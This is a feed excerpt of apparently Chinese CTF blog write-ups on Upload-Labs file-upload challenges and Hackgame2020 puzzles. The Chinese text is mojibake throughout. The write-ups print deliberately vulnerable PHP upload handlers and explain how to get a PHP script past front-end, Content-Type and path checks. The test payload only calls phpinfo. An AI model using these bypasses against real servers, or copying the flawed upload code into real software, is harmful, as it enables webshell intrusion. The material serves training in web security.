&lt;li>&lt;a href="https://buuoj.cn/challenges#%5BWindows%5DUpload-Labs-Windows">windowsç¯å¢ƒ&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="pass-11">Pass-11&lt;/h2>
&lt;p>â€‹	(è¿™é¢˜ä½¿ç”¨äº†windowsç¯å¢ƒ)&lt;/p>
&lt;p>â€‹	æºç ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ext_arr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;jpg&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;png&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;gif&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_ext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>],&lt;span style="color:#a6e22e">strrpos&lt;/span>($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>],&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">in_array&lt;/span>($file_ext,$ext_arr)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;save_path&amp;#39;&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">rand&lt;/span>(&lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">99&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;YmdHis&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$file_ext;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file,$img_path)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€‹	åˆ†æä»£ç å‘ç°æ˜¯ä¸€ä¸ªç™½åå•éªŒè¯ï¼Œä½†æ˜¯å’Œä¹‹å‰ä¸åŒç‚¹åœ¨äºè·¯å¾„ä¸­ä½¿ç”¨äº†&lt;code>$_GET['save_path']&lt;/code>ï¼Œæœ¬é¢˜æç¤ºä¹Ÿå†™é“&lt;/p>
&lt;p>&lt;code>æœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼&lt;/code>ï¼Œå°±æ˜¯é€šè¿‡è¿™ä¸ªGETå˜é‡æ§åˆ¶ä¸Šä¼ è·¯å¾„ã€‚&lt;/p>
&lt;p>â€‹	è¿™ä¸€å…³çš„çªç ´æ–¹æ³•éœ€è¦æœ‰ä¸€äº›æ¡ä»¶ï¼šphpç‰ˆæœ¬éœ€è¦ä½äº&lt;code>5.3.29&lt;/code>ï¼ˆæˆ‘ä½¿ç”¨çš„æ˜¯phpç‰ˆæœ¬5.3.17çš„æœ¬åœ°é¶æœºï¼‰ï¼Œå¦ä¸€ä¸ªæ¡ä»¶æ˜¯&lt;code>magic_quotes_gpc&lt;/code>éœ€è¦ä¸ºå…³é—­çŠ¶æ€ã€‚&lt;code>magic_quotes_gpc&lt;/code>çš„ä½œç”¨å®˜æ–¹æ–‡æ¡£å†™é“ï¼š&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Warning&lt;/strong> æœ¬ç‰¹æ€§å·²è‡ª PHP 5.3.0 èµ·&lt;em>åºŸå¼ƒ&lt;/em>å¹¶å°†è‡ª PHP 5.4.0 èµ·&lt;em>ç§»é™¤&lt;/em>ã€‚&lt;/p>
&lt;p>â€‹ ä¸º GPC (Get/Post/Cookie) æ“ä½œè®¾ç½® magic_quotes çŠ¶æ€ã€‚ å½“ magic_quotes ä¸º onï¼Œæ‰€æœ‰çš„ &amp;rsquo; (å•å¼•å·)ã€&amp;quot; (åŒå¼•å·)ã€\ï¼ˆåæ–œæ ï¼‰å’Œ NUL&amp;rsquo;s è¢«ä¸€ä¸ªåæ–œæ è‡ªåŠ¨è½¬ä¹‰ã€‚&lt;/p></description></item><item><title>Upload-Labs(äºŒ)</title><link>/posts/ctf/upload-labs2/</link><pubDate>Mon, 09 Nov 2020 20:12:27 +0000</pubDate><guid>/posts/ctf/upload-labs2/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€&lt;/h2>
&lt;p>â€‹	è¿™æ¬¡å½»åº•çš„ä»å¤´åˆ°å°¾åˆ†æäº†ä¸€ä¸‹æºç çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¤§è‡´çš„å†™ä¸€ä¸‹ï¼Œä»¥é˜²ä»¥åå†çœ‹çš„æ—¶å€™ä¸çŸ¥é“é¢˜ç›®æ˜¯ä»€ä¹ˆæƒ…å†µã€‚&lt;/p>
&lt;pre tabindex="0">&lt;code>$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
 if (file_exists(UPLOAD_PATH)) {
 //è¿™é‡Œä¸‹é¢æ˜¯è¿‡æ»¤
 $deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.html&amp;#34;, ......);
 $file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
 $file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
 $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
 $file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
 $file_ext = trim($file_ext); //é¦–å°¾å»ç©º

	//è¿™é‡Œä¸‹é¢æ˜¯ç§»åŠ¨æ–‡ä»¶ã€‚
 	if (!in_array($file_ext, $deny_ext)) {
 $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
 $img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
 if (move_uploaded_file($temp_file, $img_path)) {
 $is_upload = true;
 } else {
 $msg = &amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;;
 }
 } else {
 $msg = &amp;#39;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&amp;#39;;
 }
 
 } else {
 $msg = UPLOAD_PATH . &amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;;
 }
}
&lt;/code>&lt;/pre>&lt;p>è¿‡æ»¤éƒ¨åˆ†ï¼š&lt;/p></description></item><item><title>Upload-Labs(ä¸€)</title><link>/posts/ctf/upload-labs1/</link><pubDate>Sun, 08 Nov 2020 19:23:16 +0000</pubDate><guid>/posts/ctf/upload-labs1/</guid><description>&lt;h2 id="ä»‹ç»">ä»‹ç»&lt;/h2>
&lt;blockquote>
&lt;p>å¤§éƒ¨åˆ†çš„ç½‘ç«™å’Œåº”ç”¨ç³»ç»Ÿéƒ½æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œè€Œç¨‹åºå‘˜åœ¨å¼€å‘ä»»æ„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œå¹¶æœªè€ƒè™‘æ–‡ä»¶æ ¼å¼åç¼€çš„åˆæ³•æ€§æ ¡éªŒæˆ–è€…æ˜¯å¦åªåœ¨å‰ç«¯é€šè¿‡jsè¿›è¡Œåç¼€æ£€éªŒã€‚è¿™æ—¶æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªä¸ç½‘ç«™è„šæœ¬è¯­è¨€ç›¸å¯¹åº”çš„æ¶æ„ä»£ç åŠ¨æ€è„šæœ¬ï¼Œä¾‹å¦‚(jspã€aspã€phpã€aspxæ–‡ä»¶åç¼€)åˆ°æœåŠ¡å™¨ä¸Šï¼Œä»è€Œè®¿é—®è¿™äº›æ¶æ„è„šæœ¬ä¸­åŒ…å«çš„æ¶æ„ä»£ç ï¼Œè¿›è¡ŒåŠ¨æ€è§£ææœ€ç»ˆè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„æ•ˆæœï¼Œè¿›ä¸€æ­¥å½±å“æœåŠ¡å™¨å®‰å…¨ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>åœ¨çº¿é¶æœºåœ°å€ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://buuoj.cn/challenges#Upload-Labs-Linux">linuxç¯å¢ƒ&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://buuoj.cn/challenges#%5BWindows%5DUpload-Labs-Windows">windowsç¯å¢ƒ&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="pass-01">Pass-01&lt;/h2>
&lt;p>â€‹	å°è¯•ä¸Šä¼ phpæœ¨é©¬ï¼Œå‘ç°æç¤ºä¸Šä¼ é”™è¯¯&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTKbfs.png" alt="">&lt;/p>
&lt;p>â€‹	æç¤ºåªèƒ½ä¸Šä¼ &lt;code>jpgã€pngã€gif&lt;/code>ç±»å‹çš„å›¾ç‰‡ã€‚æŸ¥çœ‹æºç å‘ç°æ˜¯ä¸€ä¸ªå‰ç«¯çš„åç¼€è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•ç»•è¿‡å‰ç«¯çš„JSä»£ç ã€‚&lt;/p>
&lt;p>â€‹	æºç ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">checkFile&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">getElementsByName&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>].&lt;span style="color:#a6e22e">value&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">allow_ext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ext_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span>.&lt;span style="color:#a6e22e">substring&lt;/span>(&lt;span style="color:#a6e22e">file&lt;/span>.&lt;span style="color:#a6e22e">lastIndexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">allow_ext&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">ext_name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;|&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">errMsg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">allow_ext&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">ext_name&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#a6e22e">errMsg&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€‹	æŠŠæ–‡ä»¶åç¼€åæ”¹æˆjpgæ ¼å¼ä¸Šä¼ ï¼Œä½¿ç”¨&lt;strong>burp suit&lt;/strong>æŠ“åŒ…ã€‚æŠŠ&lt;code>.jpg&lt;/code>åç¼€é‡æ–°æ”¹ä¸º&lt;code>.php&lt;/code>å³å¯å®ç°ç»•è¿‡å‰ç«¯JSä»£ç ã€‚&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTM5g1.png" alt="">&lt;/p>
&lt;p>â€‹	ç„¶åå³é”®æ‰“å¼€å›¾ç‰‡ï¼Œä»£ç æˆåŠŸæ‰§è¡Œã€‚å®Œå·¥&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTQV8s.png" alt="">&lt;/p>
&lt;p>â€‹	æ³¨ï¼šåé¢é¢˜ç›®çš„phpä»£ç éƒ½ä½¿ç”¨&lt;code>2333.php&lt;/code>ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#66d9ef">eval&lt;/span>(&lt;span style="color:#a6e22e">phpinfo&lt;/span>());
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€‹	æ‰§è¡Œç»“æœæ˜¯æ‰“å°å‡ºphpç‰ˆæœ¬ä¿¡æ¯ã€‚&lt;/p>
&lt;h2 id="pass-02">Pass-02&lt;/h2>
&lt;p>â€‹	æºç ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">file_exists&lt;/span>(&lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/jpeg&amp;#39;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> ($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/png&amp;#39;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> ($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/gif&amp;#39;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>] 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file, $img_path)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€‹	å‘ç°æ–‡ä»¶åˆ¤æ–­æ˜¯æ ¹æ®&lt;code>image/jpegã€image/png...&lt;/code>è¿›è¡Œè¿‡æ»¤åˆ¤å®šï¼Œè¿™äº›å€¼éƒ½æ˜¯Httpè¯·æ±‚ä¸­çš„&lt;strong>Content-Type&lt;/strong>å¸¸è§çš„å€¼ï¼Œé€šå¸¸æµè§ˆç½‘é¡µä¸­å„ç§å„æ ·çš„æ–‡ä»¶ç±»å‹çš„å°±æ˜¯é€šè¿‡å®ƒåˆ¤æ–­ã€‚é‚£ä¹ˆè¿™é“é¢˜çš„ç›®æ ‡å°±æ˜¯ç»•è¿‡å®ƒã€‚è´´ä¸€ä¸ªæˆ‘å‚è€ƒå€¼ç§ç±»çš„åšå®¢:&lt;a href="https://www.cnblogs.com/klb561/p/10090540.html">Httpè¯·æ±‚ä¸­Content-Type&lt;/a>ã€‚&lt;/p></description></item><item><title>Hackgame2020(äºŒ)</title><link>/posts/ctf/hackgame20202/</link><pubDate>Thu, 05 Nov 2020 09:29:22 +0000</pubDate><guid>/posts/ctf/hackgame20202/</guid><description>&lt;h3 id="ä¸€é—ªè€Œè¿‡çš„flag">ä¸€é—ªè€Œè¿‡çš„Flag&lt;/h3>
&lt;p>â€‹	æ ¹æ®é¢˜ç›®ä¿¡æ¯&lt;strong>ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶éšçº¦å¯è§é»‘è‰²æ§åˆ¶å°ä¸Šæœ‰ flag ä¸€é—ªè€Œè¿‡&lt;/strong>ï¼Œæˆ‘æƒ³åˆ°äº†åº”è¯¥èƒ½çœ‹ç¨‹åºçš„ä»£ç å•¥çš„æ‰¾åˆ°ï¼Œä½†æ˜¯&lt;del>å¤©ä¸‹æ­¦åŠŸï¼Œå”¯å¿«ä¸ç ´&lt;/del>ï¼Œä¸‹è½½ è¿è¡Œ æˆªå›¾ä¸€æ°”å‘µæˆã€‚&lt;/p>
&lt;p>â€‹	&lt;img src="https://s1.ax1x.com/2020/11/09/B7TOUA.png" alt="">&lt;/p>
&lt;p>â€‹	æ¥ä¸‹æ¥è®©æˆ‘åº·åº·å“ªä¸€ä½æ˜¯&lt;del>çå­&lt;/del>ï¼ŒåŒ…æ‹¬ç­”æ¡ˆé‡Œä¹Ÿæ˜¯æ»¡æ»¡çš„å˜²è®½ã€‚&lt;/p>
&lt;p>&lt;strong>å‚è€ƒç­”æ¡ˆï¼šflag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}&lt;/strong>&lt;/p>
&lt;h3 id="ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº">ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº&lt;/h3>
&lt;p>â€‹	&lt;del>npy&lt;/del>ç»™äº†æˆ‘ä¸€å¼ è´¦å•ï¼Œè®©æˆ‘è®¡ç®—è´¦å•ä¸Šé¢çš„é‡‘é¢ï¼Œflagå°±æ˜¯ç”±é‡‘é¢ç»„æˆçš„ã€‚æœ¬ä»¥ä¸ºæ˜¯ä¸€ä¸ªç®€å•çš„Excelçš„è¡¨æ ¼å‡½æ•°è§£å†³ï¼Œæ‰“å¼€æˆ‘å‚»äº†ã€‚&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/05/B2Flxf.png" alt="">&lt;/p>
&lt;p>â€‹	åŸæ¥æ˜¯æè¿™ä¸ªå¤§å°å†™é‡‘é¢çš„è½¬æ¢ï¼Œæ²¡è§è¿‡Excelæœ‰è¿™ç§æ“ä½œå°±å»ç™¾åº¦ï¼Œè½¬äº†ä¸€å¤§åœˆï¼Œç½‘ä¸Šåªæœ‰æ•°å­—è½¬å¤§å†™é‡‘é¢çš„ï¼Œæ²¡æœ‰åè¿‡æ¥çš„ã€‚è¿˜å»äº†githubä¸Šæ‰¾ä»£ç ï¼Œå‘ç°è¿è¡Œçš„ç»“æœå’Œè‡ªå·±æƒ³è¦çš„è¿˜æ˜¯æœ‰äº›å‡ºå…¥ã€‚å¡äº†æœ‰è¶³è¶³åŠå¤©ï¼Œä¹‹åè‡ªå·±å†™äº†ä¸€ä¸ªJavaä»£ç è·‘äº†ä¸€éï¼Œä»£ç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.Scanner;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Main&lt;/span> {
